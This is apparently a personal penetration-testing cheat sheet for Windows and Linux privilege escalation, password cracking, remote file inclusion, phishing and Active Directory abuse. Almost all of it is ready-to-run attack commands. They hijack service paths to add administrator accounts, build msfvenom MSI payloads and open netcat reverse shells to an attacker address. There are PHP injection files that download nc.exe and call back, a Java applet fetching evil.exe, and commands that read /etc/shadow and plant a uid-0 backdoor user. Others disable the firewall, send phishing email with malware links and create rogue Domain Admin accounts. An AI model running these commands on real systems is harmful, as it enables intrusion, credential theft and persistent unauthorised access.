# Now restart the service to trigger the path hijack
sc stop PFNet
sc start PFNet

# Keep in mind you may not always have perms to restart the service manually, and will need to wait for a reboot (or cause one another way...)

--------- OPTION 2: Unsecure Service Bin Locations ---------------
# The easiest way to hunt for these vulnerable services is to use Accesschk
# Accesschk is part of the SysInternals sweet and less likely to get flagged

# Look for:  Services that allow SERVICE_ALL_ACCESS.  This would indicate that the Authenitcated User (read non-priveleged)
# has access to the service bins.
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Now look at the properties of that service
sc qc some-misconfigured-service

# The BINARY PATH_NAME here is what we are cheating... since we can change the value we can just change it to a command
sc config PFNET binpath= "net user rottenadmin P@ssword123! /add"
sc stop PFNET
sc start PFNET
sc config PFNET binpath= "net localgroup Administrators rottenadmin /add"
sc stop PFNET
sc start PFNET

# Voila - pwned
# RED TEAM NOTE:  This is noisy if they are looking for it.... it will be throwing error codes every time the Service is restarted
# and is pointing at something other than the service BIN.  Once you're done you should kick this bin back to the legit service name to 
# reduce noise on the target.

------- Option 3: AlwaysInstallElevated -------------------------
# [HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
# “AlwaysInstallElevated”=dword:00000001 
# 
# [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
# “AlwaysInstallElevated”=dword:00000001
# 
# If these 2 keys are set to 1 we are in business...
#
# Check it, fool.  Look for a value of 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Error messages may simply indicate GPO never set the key for AlwaysInstallElevated
# But if it was set to Yes (0x1)...
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi

# MSI Exec Explanations...
# /quiet = Suppress any messages to the user during installation
# /qn = No GUI
# /i = Regular (vs. administrative) installation

# RED TEAM NOTE:  Malicious MSI Files are meant to fail... its stealthier this way because the failed install 
# won't register with the vitim  system
# exploit/windows/local/always_install_elevated has an advanced setting Quiet.. set it for similar
# behavior of /quiet in the MISEXEC command

---------- Option 4: Unattended Installs -----------------------
# Locations to search for unattended.xml
# C:\Windows\Panther\
# C:\Windows\Panther\Unattend\
# C:\Windows\System32\
# C:\Windows\System32\sysprep\
# Also look for: sysprep.xml and sysprep.inf
# What to look for in an unattended.xml: <UserAccounts> or <AdministratorPassword>
# Passwords are merely obfuscated in Base64

echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d

# Microsoft appends "Password" to the end of the obfuscated password
# So Pa$$w0rd!Password is really: Pa$$w0rd!

# MSF: post/windows/gather/enum_unattend

---------- Option 5: GPP Abuse (Getting ancient...)----------
# Looking for groups.xml which is...
# Located in the DC:  \DC Server1\Sysvol\
# Inside the file we are looking for the field for cpassword... "cpassword="
# The password is encrypted with AES-32 bit... but key is publicly known now...
# KEY:  ANY DOMAIN USER HAS ACCESS TO THIS FILE!
# MSF: post/windows/gather/credentials/gpp
# POSH Script to do the same: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
# Now you can move laterally very quickly with PTH or the MSF Psexec
# This should be heavily restricted by:
# MITIGATION: MS14-025


------------------------------------------------------------------
"net localgroup administrators low /add"

##FUZZY METHOD###-=WINDOWS=-
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

echo %username%

net users

net user John fadf24as /ADD

net localgroup administrators Johnnet /add
net group "Domain Admins" john.johnson /ADD /DOMAIN



whoami /priv
	/groups
	/user

ipconfig /all

route print

arp -A

netstat -ano

tasklist /SVC

#firewall stuff is WinXP sp2+

netsh firewall show state

netsh firewall show config

netsh advfirewall set allprofiles state off

schtasks /query /fo LIST /v
==========================================Services===================================

tasklist /SVC
net start

sc qc "Audiosrv"

sc query "Audiosrv"

#Can you even stop the service?
sc stop "Audiosrv"


DRIVERQUERY

# Service perms
sc query
sc qc [service_name]

#Accesschk Stuff
# (always do this first!!!!!)
accesschk.exe /accepteula

accesschk.exe -ucqv * /accepteula

#requires sysinternals accesschk!
accesschk.exe -ucqv [service_name]

#(won't yield anything on Win 8)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv [service_name] /accepteula

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.* /accepteula
accesschk.exe -uwqs "Authenticated Users" c:\*.* /accepteula

# Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc qc upnphost

net start upnphost

+++++++++SCRATCHPAD+++++++++++++

sc config upnphost binpath= "C:\inetpub\rev443.exe"

----------------------------------------------------------------------------------

windows-privesc-check.exe --audit -a -o report

#WMIC
wmic /?
use wmic_info script!!

#WMIC Patch levels
wmic qfe get Caption,Description,HotFixID,InstalledOn

#specific patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

#AlwaysInstalledElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

*********POSH SCRIPT WITH KNOWN CREDS***********
echo $pw = ConvertTo-SecureString "aliceishere" -AsPlainText -Force > go.ps1
echo $thecreds = New-Object System.Management.Automation.PSCredential ("alice",$pw) >> go.ps1
echo $computer = "Bethany2" >> go.ps1
echo [System.Diagnostics.Process]::Start("C:\Users\Public\nc.exe","$me 8790 -e cmd.exe",$thecreds.Username, $thecreds.Password, $computer) >> go.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File go.ps1

****POTATO*******
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true

Potato.exe -ip -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administrators lowprivguy /add" -disable_exhaust true

pot.exe -ip $tgt -disable_exhaust true -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administrators lowprivguy /add"

************************************LINUX***************************************
Mar 19 Update of most common paths to root!:
Automated:  the script lse at: https://github.com/diego-treitos/linux-smart-enumeration.git

1. Command histories
2. "secret" files
3. sudo abuse
4. insecure permissions
	a. custom scripts
	b. setuid
		find / -perm -4000 -o -perm -2000 2>/dev/null

1. Command histories
history
cat ~/.bash_history

2. Secret files
ls -lha

3. sudo abuse
# Check if the user has sudo access to certain commands....
# Hopefully the user has sudo access to less/more, find, or a script interpreter like Python
sudo -l

# INSTANT WIN! If the commands don't have the full path you can just create anything you want
# by the same name in your local path and run as sudo... more modern linux will look at trusted paths
# first... however if that file is missing for some reason it will continue down the path

#less
less /var/log/messages; then inside less type "!/bin/bash

#find
find /var/log -name messages -exec /bin/bash -i \;

4. insecure permissions
a.
# By default home dirs are created world readable
- start-up scripts		~/bashrc's   /etc/systemd/  /lib/systemd/	
- possible cron jobs	/etc/crontab  (theres a few to look at)
- Follow the bouncing ball on what the scripts are calling...
b.
# To find setuid / setgid 
find / -perm -4000 -o -perm -2000 2>/dev/null
find /usr/bin -perm -4000 2>/dev/null

for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lh $i;done



#find juicy dirs
find / -type d -perm -777 | xargs ls -ld

# find writable dirs
find / -type d -writable 2> /dev/null

for i in $(find / -perm -4000 -o -perm -2000 2>/dev/null); do ls -lha $i;done
for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lha $i;done

# What does the bin or script call? look for exploitable 
ltrace /usr/bin/custom.sh
# Does anything lack a full path to the command?  If not create your own new command in local dir
# Make the new malicious script that calls #!/bin/dash as dash DOES NOT DROP setuid bits; where as bash does
----example-----
#!/bin/dash
cp /bin/dash evil
chown root:root evil
chmod u+s evil
-----------------
chmod 755 name-of-hijacked-command
# Now set your path up to hijack the command; this says grab anything from my local path first!
export PATH=.:$PATH

# Now call the hijacked script


Check MySQL example from Jake Williams
get root
mysql -u root -p itsasecret
show databases;
use servers;
show tables;
# See a table called auth
describe auth;
select * from auth;
l00t!
############### G0tm1lks ################

----- Easy button - Kernel Exploit -----------
cat /etc/issue
cat /etc/*-release

cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux

cat /etc/profile
cat /etc/bashrc

ps aux
ps aux |grep root

ps -ef
ps -ef |grep root

top
cat /etc/services


id
who
w
last

#users
cat /etc/passwd | cut -d: -f1

#superusers
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'

cat /etc/sudoers

sudo -l

ls -ahlR /root/

cat /var/apache2/config.inc

cat /var/lib/mysql/mysql/user.MYD

cat /root/anaconda-ks.cfg

==========================================================================================
				POST PILLAGE
==========================================================================================
cat hashdump.txt | cut -d ":" -f4


++++++++++++++++++++LINUX+++++++++++++++++++++++++++
#Raw shell... set PATH to ease the pain
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

cat /etc/passwd

cat /etc/shadow

locate ssh_config

find / -name '*secret*'
	-type f		Object is a file
	-type d		Object is a directory
	-name
	-perm		Permissions at least match
	-mmin <-+time>	File modified in less or more minutes
	-mtime <+-days>
	-user <username>
#Who are the users?
getent passwd |tail -3

#email locations:
/var/mail/usernames
~username/Mail
~username/mail

#find juicy dirs
find / -type d -perm -777 | xargs ls -ld

# find writable dirs
find / -type d -writable 2> /dev/null

#Look for or plant SSH private keys
~username/.ssh

#adding yourself as root user for later access
adduser thedude
passwd thedude
usermod --uid 0 --non-unique thedude


++++++++++++++++++WINDOWS+++++++++++++++++++++++++++
#poor mans whoami
tasklist -v


==========================================================================================
				PASSWORD ATTACKS
==========================================================================================
https://hashkiller.co.uk/Cracker/NTLM

https://crackstation.net/

#A list of usernames, checking for no passwords (n) and users using their usernames as
#passwords (s) and timing of 1.
hydra -L usernames.txt -e sn -t 1 ftp://172.17.0.150

hydra -L users.txt -e sn -t 1 $tgt ssh


# Offline Attacks of the Windows Sam (example inside backup of windows in /Winsows/System32/Config/)
samdump2 SYSTEM SAM > hashes.txt


hash-identifier

+++++++++++++++++++++++++++++++++john++++++++++++++++++++
#LM HASHES?
john --incremental:lanman --format=LM hashdump.txt

john --format=NT --rules --wordlist=/usr/share/wordlists/rockyou.txt hashdump

john 127.0.0.1.pwdump

#To use a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

#To mutate a list on the fly
john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

#To unshadow unix passwd
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

#Attempt to brute force it
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

#Create a password session that can be paused and resumed
john --session=payday --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt &

#check on john
john --status

#bring job to front to abort it
fg 1 (or the job number)

#restore the seesion back to the background
john --restore=payday &

#cracking zip files
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip

#Mutating a wordlist from CEWL etc.
john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt

#Caracking HTTP
medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10

------------------HASHCAT---------------
hashcat -h |grep -i ntlm
hashcat -m 5600 thehash.ntlmv2

# Hashcat with Salted with MD5


==========================================================================================
                LATERAL MOVEMENT
==========================================================================================
# 


==========================================================================================
				IP TABLES
==========================================================================================
# Drop all all TCP traffic destined for port 13327 that is NOT from loopback
iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP

iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP

==========================================================================================
				SCRATCH PAD
==========================================================================================
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://$me:80/evil.exe"></applet>' > /var/www/html/java.html







Sam's LFI Tips

Assumptions
------------
Attacker's web directory is: /var/www/html/
Attacker IP is $me
Created a "RFI" folder to store all text files generated.
A copy of nc.exe is located in a folder named Software within the web directory

Commands to generate txt files
--------------------------------
Return IP Config - echo '<?php echo shell_exec("ipconfig");?>' > /var/www/html/RFI/php_w_ipconfig.txt
Add a local user - echo '<?php echo shell_exec("net user /add evil-guy password");?>' > /var/www/html/RFI/php_w_addUser.txt
Add local user to local admin group - echo '<?php echo shell_exec("net localgroup administrators evil-guy /add");?>' > /var/www/html/RFI/php_w_addUserToGroup.txt
Check the permissions of the current - echo '<?php echo shell_exec("CACLS .");?>' > /var/www/html/RFI/php_w_currDir_permissions.txt
Download NC.exe from attack host - echo '<?php echo file_put_contents("nc.exe", fopen("http://$me/software/nc.exe", 'r'));?>' > /var/www/html/RFI/php_w_downloadNcExe.txt
Send Reverse Shell from target to attacker - echo '<?php echo shell_exec("nc -nv $me 4444 -e cmd.exe");?>' > /var/www/html/RFI/php_w_reverse_shell.txt
Whoami - echo '<?php echo shell_exec("whoami");?>' > /var/www/html/RFI/php_w_whoami.txt
Get hostname echo '<?php echo shell_exec("hostname");?>' > /var/www/html/RFI/php_w_hostname.txt
Netstat - echo '<?php echo shell_exec("netstat -ano");?>' > /var/www/html/RFI/php_w_netstat.txt
Firewall Status - echo '<?php echo shell_exec("netsh advfirewall show allprofiles state");?>' > /var/www/html/RFI/php_w_firewallStatus.txt
NSLookup - echo '<?php echo shell_exec("nslookup");?>' > /var/www/html/RFI/php_w_nslookup.txt

Examples URL of RFI vulnerable site hosted on $tgt
http://$tgt/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://$me/[DIRECTORY]/[YOUR CUSTOM TXT FILE WITH CMDS]%00&Submit=Submit
http://$tgt/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://$me/RFI/php_w_downloadNcExe.txt%00&Submit=Submit

==============================================================================================================================================================
									OLD ONE
==============================================================================================================================================================



sendemail -f 'Bob Stevenson<bstevenson@f1yinglemur.com>' -t 'Steve Boberson<sboberson@targetsite1.com>' -u "Some Dude" -s 192.168.169.146 -o message-content-type=html -o message-file=/root/scripts/fake_email.html
Jun 21 13:06:09 attackbox sendemail[16574]: Email was sent successfully!

http://127.0.0.1:3000/ui/panel		#to access the ui

http://192.168.169.140:3000/demos/basic.html

=====================================================
SEND EMAILS WITH MALWARE LINKS
=====================================================
sendemail -f 'Bad Guy<bguy@mispelledTargetSite2.com>' -t 'pturner@targetsite2.com;azapple@targetsite2.com;albino@targetsite2.com;rpayne@targetsite2.com' -u "My Resume" -s 94.14.100.209 -o message-content-type=html -o message-file=/root/scripts/botnet_fake_email.html

=====================================
TCPDUMP TO WATCH TUNNEL USAGE
=====================================
tcpdump -n -n i eth0 host 192.168.169.140 and 192.168.169.144


===============================
MSFCONSOLE
=============================
workspace crazy

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

use exploit/windows/smb/ms08_067_netapi

db_nmap -Pn -sT -n -p 80

=======================================
Shells Alternative
=======================================
execute -f cmd.exe -H -c -i
#did you get system?

===================================================
FILE COLLECTION
===================================================
RECENT FILE
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\recentdocs"
VIEW WHICH FILES
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\recentdocs" -v 0

OPEN SAVE MRU
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\opensavemru"
.....
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\opensavemru\\bmp" -v a

RECENT FILE from LAST VISITED
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\lastvisitedmru"
.....
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\lastvisitedmru" -v a

TYPED URLS
reg enumkey -k "HKCU\\software\\microsoft\\internet explorer\\typedurls"
reg queryval -k "HKCU\\software\\microsoft\\internet explorer\\typedurls" -v url11


======================================================================
ACTIVE DIRECTORY
======================================================================
# Dump entire AD (limited to 100 results)
dsquery *

# Dump entire AD (w/o limit)
dsquery * -limit 0

# Enumerate domain users
dsquery user

# Enumerate domain groups
dsquery group "cn=users,dc=targetsite1,dc=local"

# Enumerate users who are members of the named group
dsquery group -name "Domain Admins" | dsget group -members -expand

# Enumerate groups named user belongs to
dsquery user -name "bob*" | dsget user -memberof -expand

# Enumerate attributes for the named user (dn, desc, samid)
dsquery user -name "bob*" | dsget user

# Enumerate specified attributes for the named user
dsquery user -name "bob*" | dsget user -samid -fn -ln

# Determine domain functional level
dsquery * "cn=partitions,cn=configuration,dc=targetsite1,dc=local" -filter "(|(systemFlags=3)(systemFlags=-2147483648))" -attr msDS-Behavior-Version Name dnsroot ntmixeddomain NetBiosName

# Query user last logon times
dsquery * "DC=targetsite1,DC=local" -scope subtree -filter "(&(lastlogontimestamp=*)(objectclass=user))" -attr lastlogontimestamp samid cn

# Convert NT timestamp to human readable time
w32tm /ntte <NT_timestamp>

# Enumerate disabled user accounts
dsquery user "dc=targetsite1,dc=local" -disabled

# Enumerate users inactive for the specified number of week (2 weeks in this example)
dsquery user -inactive 2

# Enumerate domain computers with operating system and service pack information
# Can filter for different OSes by changing (or eliminating) the "(operatingsystem=Windows*)"
# part of the filter.
dsquery * "dc=targetsite1,dc=local" -scope subtree -filter "(&(objectclass=computer)(objectcategory=computer)(operatingsystem=Windows*))" -attr cn operatingsystem operatingsystemservicepack

# Create a domain user that is a member of the domain admins group
dsadd user "cn=Attacker,cn=Users,DC=targetsite1,DC=local" -memberof "cn=Domain Admins,cn=USers,DC=targetsite1,DC=local" -samid attacker -pwd P@ssw0rd -pwdneverexpires yes

# Modify a domain user account
dsmod user "cn=Attacker,cn=Users,DC=targetsite1,DC=local" -desc "Is 1337"

# Remove a domain user account
dsrm -subtree -noprompt "cn=Attacker,cn=Users,DC=targetsite1,DC=local"


================================================================================
MAP USERS TO BOXES - Who is talking?  Maybe Use Bloodhound
================================================================================
run event_manager -l security -f 672 -p -s Downloads


================================================================================
SEARCH FOR EVIDENCE OF PRESENCE - Is Someone else there?
================================================================================
run event_manager -f <event_id> -l security
#events: 538,624,630


================================================================================
+++++++++++++++++++RED TEAM FUN+++++++++++++++++++++++++++++++++++++++++++++++++
================================================================================





=================================================================================
==========================+++++++SCRATCH PAD++++++++=============================
dsquery group -name "DHCP Administrators" | dsget group -members -expand

dsquery user | dsget user -samid -fn -ln

dsquery user -name "dbagaroo" | dsget user -memberof -expand

dsquery user -name "kelli" | dsget user -samid -fn -ln

dsadd user "cn=DBagaroo,cn=Users,DC=targetsite1,DC=local" -memberof "cn=Enterprise Admins,cn=USers,DC=targetsite1,DC=local" -samid dbagaroo -pwd P@ssw0rd -pwdneverexpires yes

dsrm -subtree -noprompt "cn=DBagaroo,cn=Users,DC=targetsite1,DC=local"

run event_manager -f 538 -l security
run event_manager -f 624 -l security
run event_manager -f 630 -l security
